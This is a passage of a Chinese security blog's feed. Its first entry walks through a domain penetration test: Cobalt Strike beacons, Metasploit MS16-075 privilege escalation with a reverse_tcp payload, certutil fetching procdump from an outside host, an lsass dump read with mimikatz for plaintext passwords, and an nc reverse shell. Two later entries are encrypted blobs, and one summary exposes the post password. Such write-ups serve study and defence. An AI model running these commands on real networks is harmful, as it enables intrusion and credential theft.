/domain查询域组所包含的用户：net group 域组名 /domain</code></pre><p>先获取域内计算机名</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/12.png" alt="" loading="lazy"></p><p>通过PING获取域成员主机的ip地址，然后再用域管理wmic进行连接反弹shell，获取的ip如下(没包括域控和存在web漏洞的ip)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/13.png" alt="" loading="lazy"></p><p>cobaltstrike上线0.4和0.7的主机</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/14.png" alt="" loading="lazy"></p><p>在对0.11主机进行连接时，ipc出现了错误代码86，指定的网络密码不正确。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/15.png" alt="" loading="lazy"></p><p>应该是域管理限制了这个域用户登录这台主机，要其他域用户可能会登录，由于要system权限才可以利用mimikatz抓取密码，所以这里需要提权。</p><h4 id="域控提权"><a href="#域控提权" class="headerlink" title="域控提权"></a><strong>域控提权</strong></h4><p>systeninfo先查看下那些补丁<br>批量获取未打那些补丁</p><pre class=" language-cmd"><code class="language-cmd">systeminfo>micropoor.txt&(for %i in ( KB3164038 KB3141780 ... ) do @Type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt</code></pre><p>获取到 KB3164038(ms16-075)补丁没有打，metasploit提供了个exp</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/local/ms16_075_reflection_juicyset payload windows/meterpreter/reverse_tcpset session 2set lhost ip地址set lport  端口</code></pre><p>成功提到system权限，可以利用mimikatz读取密码了。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/16.png" alt="" loading="lazy"></p><p>由于域控上存在eset杀软，可以通过procdump+mimikatz读取密码<br>先下载procdump到域控上</p><pre class=" language-cmd"><code class="language-cmd">certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx/procdump64.exe</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/17.png" alt="" loading="lazy"></p><p>执行：</p><pre class=" language-cmd"><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/18.png" alt="" loading="lazy"></p><p>将lsass.dmp下载本地利用mimikatz读取出密码明文(两部操作都需要管理员权限)</p><pre class=" language-cmd"><code class="language-cmd"> download C:/Windows/system32/lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/19.png" alt="" loading="lazy"></p><p>下载到本地之后，mimikatz执行：</p><pre class=" language-cmd"><code class="language-cmd">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"  > 1.txt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/20.png" alt="" loading="lazy"></p><p>读取到5个用户明文，这里我只给一张图吧<br>最后登录0.11那个地址，由于cobaltstrike一直都不上线，我就采用的nc反弹</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/21.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/22.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;CobaltStrike反弹shell&quot;&gt;&lt;a href=&quot;#CobaltStrike反弹shell&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;CobaltStrike反弹shell&lt;/
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对学校的某次渗透测试</title>
    <link href="http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-07T07:44:45.000Z</published>
    <updated>2020-05-14T07:31:02.519Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a8c6a40e98316f3a60e3d398b89d99c159b967c09c63cbb9d0ce8b60466ed998">dd9f35a0f7a129882748da09be428af5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码：TloveY
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>实战渗透测试(一)</title>
    <link href="http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2020-05-14T10:13:38.659Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="62e12fd3a0c8e8c64c41e16642bf9753550bdce90032d181ee4404049cf149ef">18d47651770175ba369f96b468a937c1fae81990cd09ae7f10976f586069165c4483d03c6e498ef14fa4d5ae0ef752257dacbc6baf2e25857651cec44e1c01242d3ca13053895409d995d627b75efbb7dbbba4f9f253030de45c462a6ebe7a9f0848bf9e1f5fc90d1844c2bcb9e52227631d59d0ab035dc0b039c567fc5578c445144e57e3dafeb031bba2a0bdf359ed5ab4f5bcdf2b4591968fc43f9912170b1ded31ff33e6167ec9f150da24985fcf78570c4913c2a53f8168fcab5a0e5e8ccc8f8793813e750598f1e9a46d4d5cdb963811e83dffa9fe67788a75c9d07ef5cce617bc250a18489980fc6101efd5f9ca71b7186647399a2478a8b5b6b07bed2552e5cba4424e57c83c028d79e2964d42121f2568062bf115ff9f9eb408f40a723620afd904b726db32fe3628f29ecfdb5d9465ba7c7d06fd2680eea97b9c4c69aa569d8d2390247e7874a49a7003f771d112f22f7d35287c67c7e7a4f5577917211da06f1beded79ed93a91759eb5567a1353f825c6fdb1d61c77ff18466e16c0ea39f848dfeb45b28792ed8218840168a263d9933baad1fe8e4fab66e5f1b7b0d522c2f3681370af0b939af59e8fde7ded75737f6c9ae95469a353e4efe7840868ef3f7a80e3ba2235d0e051d5064897f75cb2938cb5e4a98eb8ad53413e46450af1d54d6be9a0a21c3abdba8ca9517459a722a68eeb3116e7d5da8648eeb36e6ff108b6e372582dd43d71bc7688111ee3e6c4af2278f2e8b13cae6951d11a7f9380517ffc1c6bffc42bb42ebb54c691cfeeb8e9613fa41e82344d9fe742f6ab914a45a4e3e3ee199ea99f0a6ea8dd9fd3f8fbd2f2479a629226199806303fac5b206e382154454f4258a52d32fb973c44b075305002b1de34a276098985c27789626ee01eb8b9b38d9e8f1e99445f0137a340eebd75d20b8d1d8ff62ca6c0da9926d071c4335f336ca8ccd875ef7abfe76748a00332847f8464f98df7eee0e13cd960ddfbfb9af5de3c0467c8d01dcccc4e6239e6bcc17a8f2d6709b7aa44d5a14f61d5ed4a09a8c447dc8163ba3096e5581e6088f8ab1bcf1b6b2116931bf021db3c6f99f57f2ce2a611608883950bf088fb9fcd8d9820f32deeabffb1f305bd80d512f7983a5cb5bb448ec5a3d2dcbdbbdcba3528092509878b7489f737e55eb6070bc97730f7a4183b656d8f848e039dfd37cc91e54bdc969b29d08dc0b114e78bb74db3113d99bf2a89733be913703c5da3151aee1ad9cc4859ac7231c9abd531fac4a80a48cf9d74e4bc9737cbe0d49f3e9da2521429beb991efcf423c79bfcc629212c52532f8aa823f3f19824ce8a8ffbb542be76b47739be28e15259bf22bb3ba5bd8af20c1e104b70e1c5230646e5e3886bd716b2dc4418ee7401271620d3ef2a2896fb8717c4e1a2358fe6d63311f27d26e25516a1e693ae8c798021162b5e24124e567b2c27d4e750e1955db6cf0f09be9bac6bc1fea6e013c3528302f0956a6528858b250adfa73206157765c79a98a21c2bc8240f37ecc6a95bda998d55d8f0bccf213ba3e5bcda5d1a7c53cab435b73c643ad05285c69207abac3dd0f0b8a332b73f43ab502958fb5e9159c60fe1b42f43feb33e2ea041520099d7ddf634d113eb9876f249dce8514e7123e959966dcac45dfaa9ee3b8694e0898ea4b374b2b5c4d64ceab0ee4391e95934549db2326ff9d5af3fed7239cfec8223c6ed9565d5b97ebfa0190415b860f81688d72ec4d6f1c7c1d73838bba9b7ba283e5c76150ec7f5dbcebee3c3b1347d2ff355b383b2eb6379fe67031a3f1ee914b15d8a704bed4a67c19e0dc92a85ea67c523ed06a012875dcbdb09a9f69d93a99c2fc5ce69e7f4428be87985f1bf68f26d7a2d0121d3d3a25cbdc04cbb32d7fd7764f677ca793138b818983e9e324d24e76323a77a7033ddad5d61bc60d598261437b0973369a5881d3e5e0df0c6ea06bac22d86f9290187e4ced889bb0b249e882a82feb67020b85956bcb1b6bc7df7a2cdd0f15be3d978d5fbac2ca5716eec2b0e9437bce735a91ec60855d619c8907420eea0d6d16ed1bcd249af0328c9101e5a97a9f118793508039ab6a5c49149e18d6b67ddb22a03b177f48e98c08f2e462c605f43f1bb939d590324667613c257aae0e2bd209a9dcd8f9addb6bb328fb283f747f546e9d6c6405fa7dba16bd73a371850dca6c1d05b91f8e4dab7f7e88048ab9823327214641e1e5fa422cd6e9c8666c9c85264ff27dafa3e1dec27f250bdd292ee245112562899761be8e6f6e63e726f91fa24d52b84e85c785dc542e953c49852d28263ea16518f1a036e7807fa79821e6a84fc7f3a1b281ffdfe623eeedc1fc4929d7d943229a8c3e9826697594d4697033a0c5f1d008a64cd45e454bdbff3f84fad9d146838c4d66429a77c3a3c103c6fb3cab3a344ca5ca21a0a9464fdd1a346550a3270e7ab5411f392c10ee6108ca39bfa1c30bf9a9789334c36c68f4bbf7d8f8137382fccd9058dd2c63bdb2a15de88cb0b5db8c43d6cb37f75dfdd08169baab35764c5b4794f5d8921adb839e1c50910790d4063785dee89658e31498fa08240a141ff5309a91bc9e678d60fd2d294b78bd7093b6a92f95ed1300cfc45ace0c9cb79e1093363ddbb9e775f4db68754b870762afdb45c8bee2842686c911470a6894296f688b6332f9716364387f339ffb18f6e36d21f81964520d03dca756383ba0d54649826fab4001adadaf8f006345badb998f0795d2819ced213348fe16081fbed19e67e1636991ad532e3a0985addfab9bb6080bd4cde4e34a84d1a70bf96b38bae24b604b1f14d51b782014e0c5f1ea7870518222cd21c1e414ea8a00c4d8d03ac62515f922cd3873806eaf9df4b89ea4364790d5a0e7635dfaf18585a6b984efb891e582a7d7359303ae839f5845407e41c83026d85e1f6d9c4f74b19b3ce66f2bc226e4f6813b5f2c4ae8be4268da8c182fcdc0bba9418e41ce62152dc6e4d7fcd693c1d32f173e8fe3ff74b2c14596140957a3c0310112ff93edbcc794ef1cb8c31f52d905c832e08401c0ea8cbe7ae14a1ff9ae13e05564149a78d4506cc8347211b967a8db182c2cfcb720c9e72e5c33ab3f7a79bcedeeeed2664143a96393e68af43588647a20cef5de24e1f20659eac249c448a8e72ccdc41d61b07b0a112ee42961f09dcc3b347ef3ea43d891a8ae4aef7b7158288c44ab295c55a655652c8a24d276723a1c4d96918e56d6286eb26fe902b7ba45304ef18bde203fa64bce0ae82aef558dece751f9a81f36b4b14b09ba3a0a5ea8ba4914a68a78097a2f08163672bc5fba07c560fff486a761a1fe6c69279f60d13029d27a2c9907a3d571ee0b9f9375c23f80d1a29eab885bb0ba07d654d49bd7924a64fe2f05c3742d25921e7ebff4c7dc10e36328e9d80ca85f13dcfd23f1470c469ec69eb014218eb70fa5c05b87959fc8601f064ba7258277b704fef3e7b453e2968ad39e4acaea426840482709e594a4974ef5492178b6454468c84997155cb0afe87a923e1bc4de18d37cffa99272ef9bd355613a52980c950a52b538db77930959db8723102d6705a4d2d157a040c81391137b9f8fbf5b11793d92294a5b0e71e49b4221aba85a429347f9c765ecc8eee69feddd4badada40530c2e0a6dbde7c08a32a76cd6ebdd6561aed3622fa00697748c9c95683de7b3953d8de52e6619304905188387933fce58b0315c304f02aa03cafb049ffe3853a75a97309ed03c1923bd67d26fb9d43ad98b2d3112c1bb90d27093b83eb3dba4997400e1486fd04831d41dbaa82edec76fe6f987e97e9482d3cc667b6d29aba7cdb6cc5c2ae23f24a2e214ede4ec499b83e815d9dc905f34132112ea9e270fb36cc13d45b87acfaf716b17d31a4049a760d4d129a6f7e28ee5b239001d61970f318202307255e99cd04f24462e9f0eb5bc067dd4575eff7f8336715771324e9aa6dedd08e5d3b8b4f2c0e16494344bca1a920bd6fc877fe81dbc3b623e1ab550bc47870201eb6a9530ac2f4f88097512193e06156dba2dbc4ed204572123c71b967ff78cfbc81f95fc62ae72722cfe5323dd7a31cb755b08bee7833844dd9e5649eef9b2b3761de68f39aa4c2c671d4a3bc35bc709dcbfce2bb496b9a6f6cd4a9b5480a802021f87471ca1f892dd4e694c653eb0d9e3f4996697668bcd02a58a2b7a2dd263b84b0b01f290d412c50fe66f901ceec1a92658f8177b83acafc15e6da5f729ff1acd3a3e9d66d0862e1751bebe8e25088b5a44c5cddae2fb4de7130a5e22ceaa181fa57fdd07e65ab40e0fb5492282b876cf4c2855a5d6bc21e878fd05efe4d78913361200e0bb1b3dfdf625b6cc0ba714a5baf8b1a81742bd9e612b9a8e522bc263bb8edfbfbe01a7a0ae63d20debddb7ccbae7ca4c7ef3cf5bf87fd0f66fc027021a27e85b542a90d3a01a784c7144fb7f27a94f4525ac36c37d7cd6c587bec942f4eb90703c7e111a55e82999b5cccdd2cd43109d1ed79a33b5fb1e818d733e15fdeeadd14eac34aca43a714f3a287caa43e335ff2d37c4cf32d777f6ad77dd5713e193c5a1a78e2708a8f36f76f19c15be0021b60a9e6007e2376a5ac662498ea9eb9bd1f57a608e8fee935e629c4622c98822f82e516826a953514b2284b956633c58b1fe5eef9bf31aca0cd43c9bbc017c69a2588955f12489411b3dd4f3a74d0a2c2342b3d1db8ae6ba728c828f492517a0ede2015b7bfc2c66f1c3a78ba2a254bfa812b465f630c520234f7bd88bc8b4975bbd0de8b4901d4698ae389392a033a2aeb849c671d11dcb6ed985656774f605ac5bdc7ab7fab66b8375c2ca489742e92f3f5b898ace145bb692b912dbf2756e687f1e38689dbd96ba8dd70e2f222579a948322a55751e6a73c92dada6329ef166631313809529f94ab9fab4c162699c9a23884fd8f081697faa894b2293cdeaafa9b73b33613fb02a85891233b8ce79eb28f1189e3c22b699ad11507a1f5efb97d129b18091191e586f5e26744a12e49cce598eb29b59de6eb88ce90505dbdb47733533e561233654421b06c04ce02dc6019dd132e5a693ed420b2bd5bcad27d2c19782d71dfa87d24a3937fbb07755e046d70ce662f00f99dd0a2a8023683366930f1627f33049b22c432596c14bbe666d3688ad4c7fcd0510de95ee073e9c71479e0df14f2c334279bacfc7b3afbeff436dea67d8db2d18b85a6096ef402613662876061f675b6a9bdf4ff472624fc0b967bff78419f6a584c0fb9e4b21276b07beaa9e431489f7e5257a2dd610d59310e5b353041cc110c99bc28ca28139d8acbe8bd2654c32b307c1e3b56421f1149850d6ef213f0f09f2f7ebaed6629e0b342c770c2b7c4350b3d45b755287211f7818cee5cc50a4e10d7f50c85dc53bfd6d3af076f1077d852d601529e578113ec2c9f53af2683bdbf79b9bbf2ecbc6575b7d48f8bd70c2ea15579894725d72be96f03946c181a4c14bd1a99a51b5aee6a08789528fd8107d150e09226cd29f059798007bbbba2bf810b368b162f2992a17999b2b9dd44931b83de60ef9f9b49b25f78fe0b8e2d286591e5361b132e3f1d64863a8a098f5052030e2e4f071c9099a4e1519f0df9accd8f3e4915ae03800764e3d9c80a637c9082fff4a4ec216a00307b7998604da77dd06e7fe3bbd8c7c5fb991b751b140a184ca0f7e1eed0b3d4a6e4c837bba591dcc91516279f49488d033e96fb5c8fa18f515cb83189014ee1c6f2b0a64198be93ccf347bd5a1e9dfec5f5ca08f189cb1d43470aab4da307bae090e5a47e899936b4a9447464b9900f1635758806f5e8353197091ef81fa7ef65a7e322a333a4e3e76ae783f5fb09414425f828dcb4da5c91dc49744c8ca28e21c523fc2d72286bffb2d9dc5ea73977c52b832a19b746d592a196f7c138ea10040f5464843a8ec8f92f97a1b9b0d0f60db101e0d0d4c83aee81b25ea12ef54c3a639f719a5dfe707f84c70432ca09168434967b08db9277787fdea88eed1fab2a30d402a1e9f3e27322b5d39520bb23866bb44ca17989645366d2763af8e298714ef2022f7fced756119505cb8f9b66897ffcdcef4aa3d4ab716f1b28be45f48b2fed1685b8d2d8a671c4054bcb13be52c5076161f95bf93da494d2fececba7258836dde6d33ff471e3a2d0b5a97985606295de52d0a397e3591fb1ace77bb2b115355ddf280900640f718c2eaedf5282a840c095c30e7086c9c67cf1437a462a3467c510a0d9aacfd14b16d0bd75062326c4726ca9f4a6ef4b019dcab2d51b45f02cea061346f79ed9d05cf1dfdd8b8536af7df472fa6d977a3d38a6871bac7d8aeaf26c8f3f9b53d80be9104054da60abd41f2f50b1323e3d13416e9a94a2be8a5e47e8d0a3d08f319190e5f85ffa0ae6853cf51c477f2c0ed8453e113e41a37f15ff8c95564276a075f47693a259adc09452ff1a7491cd418bd3d33e6364480aaaef01064138c12d40ea1045154b132fd1e689f555870c36ffe72d4292533e36e7c32cdc73aac532a91b03032c9ea9ea98d1efaa22e500d549b9f579e0004bad2d988f35d7e5b625760cc6314b0e044cd070e0ebed35731b8ca5edf590e227fcb8c390adf8a9e697af7c7d0fb8e50c9934153f212198abe7f98a87904709d24d2b937fc2068c6f4c3bf0cc550970d3e93c76913cd15274b6ffda903df044964a8c6b0434e711c4d76727225fef48d0f98d1b14e934a4d20ca7c003d526d2f69678e043e92691d39a17e9feef334901e4f1511f8ec62b2e400f3b5b83ceb3217a63508c21578fb60eab30781863aae7d4130cfaf400a495b67cbbd56d0f817bb6aa40c89bb73eea5b6fe22b977359620daa69c00d6b94c1502cc35f04348d5cfd406ec22408e0f699b68d33b43d2d76fa3ede3c197477e52766c28c4b7462b0c14ec20627bbe7053570bc32cd3750b2f3ecafbfe66f6c4a69601308a8b9d2bcc237425c5f7b65aacce49f3c3ae896fb3c6dadbd0d45ae2a1740939d5f14b4f010cfc2cb63cac62bd4352adbb6e125f3e638c170f2a6426edb574f101218d0ec447c168372ee083e858bc233bfe1875672338fab19666b3958042e39427df21c5e052f1de17415ed90c4bdbb8e5675cd7548d783ece4a1142d04dd7e7b38627a5e72779c927367e64f765c48571194a72ee4d1403b12c365905685ec38148c7f9081abda7047f98de67b99d6656a69f601ec0a89761b6bf264216315ecc6c14cecc6c07e56b39c3b297e234ccc7f22111bf5822260c3b4963405dfa5b0ca25e59591b99df119c3c23bb7bde68f78689eb2081949b973f1f2bf481ab393f1f2f08195a6dff28fea84a81d2f307e44a4cc0beb66649599e0a7f4507ff278916f2f129a5f3527d4874749bbfce9217cc2f36a8d8b1b7c75b9ff492c1ac512013484c10a9ca95d143e09c379b56ddab8e1b476e771ce1dd9cf5d3b16bd3cd134fd37afca371ca564d19a2e069f16b7c9f206c3bd3e61d4760ee3f25c40830ef00595c1a6106c3316616ed84408014c3bcf08e42c9f410c4df8c000c814699b538f204ac21ecbc18e15ffe1656e0ab5fe53299de54349a27fca37629bfe62ac83d5e4d4b9ca2599a5e70fd42a5d8e5d6d58844d495ea771f736639c3d5debdf942bcba23cc86a953c09c26b5a169e57e714cacccc54d8b05fff2f864f5c9e1464e43ad2d4fe28d5ed4697352e6038340494469e795e5ae4ada0847e0432d689f60be1f0a7c316cbbe0c45f2476d1e87ce0c04735dcebed323899b1aaef75e99442376c30b183b0bdf59ba4d7b97ef073f1f32ec4c1c5aca865cf1e76da1a809dfcdb111e945d5f908606f1f8e1d1b2c1353b0fdcef12bf376e8c831dd427ff2fa21a708f4bbb183296dfdd71b93963c29edba34fa9c525513dc5a62565ddcbc19e1605dfd5f4d4fd809db81ce95030811f295ac58fe62e13704da46b42acdc7a1a7095bd7d762913711ad942f2c21216d0c4b0712879fa4d4679cd1adf8887a75dff0999b404980fca8a1cfc1a8ea9ab434846e8c29f18a5dd59013054d68bcbc7573cb9e183b8107b6e4109d3dd879e08ee685b82719178dafdfaef687d0b0aac50da9ae5fc3c6894caa7ad0c0d9b8f8ce20720fb3579d3b8b4ad1ac6cc5585197f89e8ef27d9644ed031bda96aa98e4c218157c648bd7db1e254d4b596ec9f255e001d1f3c045aff179b00182afb652206ec61a0c27a84d79a7dcb0c7f41a45c4d6fb092afabd9c318ff40c0b44e9a59879242fa8899b52aa2a9debaed53bd5007a3fd6740a96523dca9b1042f797162a4bd4e4a27669f538ffe000fc5a8d2e28fb26346000f539fce38ffe5d3028fe91e73e0374dff8257412a0066ec3bebd5e5fb4af8709ad9b0540f64ce3ffce99ab470d1f10d0b1456848bba57c2ac2a8eb334c9e9cb51fbcc282e87bca617d8e8ef300ebaaad48065c0f3466c7a75d6f8b6577c516a31dad730aaa0747c2e91e2e2ec46cb2d3066881f17a23cb4fb7fd8a825b3ba625c8377f8c851d770529bcd1c6b206e097342dd5454bd5c7d986001d2676f954e5734ce312d30cc6520ad7c99b2db309ddca3de0d60f7db03b970194e23cf8880dec90c9cbf163995e757d3df10d1e6b3ff9e801c773fd9dce2edd5694eb184372009e492afa071e69bad3c6b3a54ccfb7be68168574e40d185c76edec9d2752afc995a24ac4be56e95db7649955dc01ba7f870f7dbcb11dc383ba5d7e6f2d1e109d22dcdf242599602e835707c7490d5e8e446d812560cc71f65139ef8aa5f50bb0a1ce3856a38ba9d8c7bb835e6d0c078f3569d94041f61ffb3b26a823383d7690616e422ad910d6d216463d5d9b6f63bb382c23398ddce485334eeee44bab85409aa8c512317ec8af4f56dbe53bdc22dabe9138f1c5e9b963e90f9da882f26dd5e129c38d438165801b84807c831a5e32fce9310bb3cd838840ad0f4e55c612b389259446e68471f7e8e089004f32e61f67e1de353483db99f36413e2da0fd3d0e42ebecc4a3a8940347c0a11d485ad6711ad87afe78593a8ef743e5595c8e78fd8ecbf20f474b4e8da455970770bfc75d2295f7ba8a9a5f85a634ad3f44095e5c4f1f2ef5652bb20d997439dd50f2361e9f30ec403061751df278b99e35d14377a07bfb2c93b5076d74e32f498a9c73dbbeb14cb1c1a07fd6589f407a2296d4c99eb96cf080946590e9bfc579608579198d44036a0b109a3207beb72cce0240a658525141de983ce5197103380e1df6f14516f5e7b84f88db03894207ac5baf491f297dcbfe76c07bd374e0eda0f812812db98e62c5bf5e36ba9eee0b7e631c3c4f3462a94147a7cf2030109c8dccf7ff102e3e4dd2917f2f39ddefb581d4548bb18739d5ef4f068d61494ca7d6ca6b18407afbefbecdf3488c38c48b5bbb389b04f8107840349d46eeb85ba5d884ec6d44a0abc954b8130cf8c0b5968869b0708e792e5f7777340d5958cea2a2d99419af244dac53972190113d5a10c10055ae74f43a137fe05174acd253da0bd40410a7d816094ce6d94ab57bebe1695563efdb38e60384d61f83b759187b699c60a92fae4af65d04a612f7bf57aeecfdcd44a1fa5dfa852273e9689d9f5a6ad492ed612b7ae13a6a96e0643eaaa3485c64e61f6852e80ae05e98837decf26ba83e02a12ce22ffbc63eb75232de1e1b2f58f08d9d2507f018afcca1044b849cbd844ffeb323553434306d1cceba0aa87dc52996f6b467e5d949dcd9ce624998b1e42a565781953769c8cf216e599248e206534799c24e56dc9b042f025dfc9e3847e00175bbbdfdca070ef3cd7376706e69635e0295b92ed74f2fb733e2422f648028a583a1fb6b75dc395b76a3fac1f1614bb64d41a50400fcc8b1a258e0bb9231cd89b425644dea96eece27e7c3986ea0954858405037d2a120a6e0eaef7e3f840f8e696bd3d5073c1c9dafaa4bfd319dcdfcf17f9b62d86099e94733b426f7ec0eab05af70560dfeb61ba5bbfb8fcc0322c637e3a8bd4588cc6c1897f5ab4058580904d56df8d55bae0a3a0d975b4629071b647e05a84eb0b6aad60efdfa90866471ee94486dbbe67e5b5aba53691b832c0ebab0f6438e984436df5927d7da505917cab9b95e5d599644b691db407a5885b4204e60b53507e0bc5e681db800600689e3f81565c6b714ab397585861e1d8cc726724ae215562f0e942b6dcebadbef7aa29ce33590dbd4dc58103fc52cc260ec28d77fd302fb0cece926f10f8d706214103cb511ce30cc1f996eb6bb4ff661f43b5ab28c0d3cea1e080faa604888c624e6e7fea73d3387058442e980e687f5a6099c585787ccdf596a65a9f2a39dd39ffac8279b3f01a4ec6c6efa872646868fc002e73491f48d27433f0a75def5e64a0cd4b1410b2320e002d137a66c21cc6a0d3802951ea0129f3036c739728c39a629a0a1b06daee5f957ebab17c0b3a1e546ffb03bdc06236eac07e6bc2239c79218700c888bcb36458e1aa45a81be1b1c7e3e3568cab73c3171f3e58901606b8ffa63cf532f5624e83a9ae78c71bd498a0935a4ef9dcd372f88597ca8901dc97f5649891dd6f2e0b9e5fc72e929062c86481c615478c664697fdc2d9ea4d87e76694f67d786e0a9017e1e2d1f3b07ccb06b9bd4688ee424e37ca54f51b5d023a7edcc1168b4af603048a76f85c657cb99a6fff181a1290292d6778417b8564e547530a1f839318e52af368dd18cde52ed4747216f5b689aa1da1bffdb1c41ea9f433b7d822d35424539fbee17b3de339ca9bc6107896908479377f2e30508619b7964a7c92a172054a7adb5375b1df16760f7473dcc7bc2fd703d165750e0bd0ab3f94da91b80df0dd6ac6f59fd18314ea7acb67adfc00dc570b5f21c91021a65e50fb78da1a9abf1822a7784ed0d1f56f18aa0ed69dafa8ba6a4b1ada7acbe615d61c7204e822e34a3ca9c2df5972218767ca973445b96bb1dd81443b7fbae37ea2c79fb51dd5deca57a15d8560fcde91723d445523b888cc698c0046260bd9e0e1528a9a45a301c6b209255286010c969a5cf592293b5f5b472bc286293b9215c5c341513bdac8b895099d42421b8e78a626c95438baf38022c63463e74e05b121365b55efd07639cce1dd464a2f30878e66c6b398973b3105c3d3a4f5672db897c67cc236850cbbfd4034c9b137465394ea73b1f9ea2de0ff52b7ae228c097571f449b041b4202ebebea78e535cce7fb2ce89f24b82ad94efec5e10754c5cee5f46df2bd253ddca8d2aa377534473555d945a27c7b0a01a2dd28c882065b369cc36297a2307b1314d782d5c96ecd124413221cb9eb510ba26f548fda048f4acf720fef34759909ed495862addeb312418b3cf1ed8c26785ebfd48056aef17807c631a7fd75966a149db13772a9b91e9a31f325ddf48d6c35ab7f5c3df8b05daa03ddb6134ced5e7c89574d54499be27f9c7b4f3d1a864a0bce599eba7787ad823c7cecc4a81be06e5df201878c7a0661568a1311b34e2b5d83d165da488111c8be0174a5728fdb9013cb9d7fd22029185b1a4b380e86d02d821ddd27e06d39c44193bd87d8031c5d726b96ba786857cf5f9d0fb48df5bcbd8e6e0aaa1434b72c7cd47a1931a161f701961b95f2078c9050e16de7269e3f1b8420b72839a62855a94913a25d6e17157b2123c6ab22b1e2e811a5a38e777e3db3e2cdb8de519fad89d62f229acc0fdd0bd77b510b820d8bafda0c9b03fbd7fb8001410ca7e2d1f41e1900bae78a51466c8ef80c6ef3f5a116c0a83671eb03dac80633a51cbb4a248cc93266741e78aa0abb346bb47ae548e1908ba9224d8b7556a6aab7f7a91db805fe4ab5803fb2cc7da11ecf69b3c0c38a91e4018152370905677e63ce74cec5f8e5e5e86ac2a80327bb34e0d52818e4b0615fd8a568ff4b004d3a5dea64b224b10202b63f9d463ef3e35d162ed9fd5b13fbbb2c909d20c59f095052ce4435b679d5c2b33a6a56c79035e2b194c32c085343f761478dbcd8af6cbf9ddca9c98d2c695e9b54eb81876fdfc89b8404a0ed663d55a2cb4a95ad66ce6ca33dd26773230632c85a9af8d80cd80512b9b075401f0fed6f7d893bf8b2bccd6c30c24415ea6b9c205a4f25417b4d0834ca4828de3a91ef93e1b6f2abe5d7fe4b21b6cbed11ee4184c8e6702747a34b109ecf89d4ea02764561db5926bbd13bee64d833cc7037eefa63e846760d50e60e04f629022d9b1de8cccf4d7a640d18a84f19e6824cf682f696177c80290ebdb5b3d2af0cf286c6c51bf73efee68dd16fd8936a3cada7e8ea9fcaa3ee7e8de5f259d7afcd450ba77379ca3e62d1175262540a1e43c66bd8389cfcb6466d7b69fda00cd7da0a75da5ad6745fd72a8bd28728bb65c8ecf49dedb09ced76e963e2b12980a7541df6c589c2f380919b74326209df61dc640e8324554891184c4c8d0f4fd2633ec57a32a5f7b790d007ad4d98b59af3e6085925f7eeac0ef5060c504af724443a46ff95119ed130f41c8a9a4f1670a11b290af6cd50267a1d3332af9364d2e5336c0a9e6b81ced7654a6aeb3d81de9bc79524400c3a22d62106e575c8c76a20b0e2d5e25ba93f4a7c4c18f58f9d6b929d58bd7a844f864e37832842778840df5bab0f2da7e7b582e36c39f31e8e28eace00d54abc4a33c98a100527f0b682871ab3bf35f17aedbe21a714437530c9f046325ff9c40455121acc07c3da229a9062df9534b3b5be78f53cbd8f445bd0765c1dc21f66b61643faaaa75527d60250dc06d85cdb51f6f596def919152d599b2fcf30c32bbc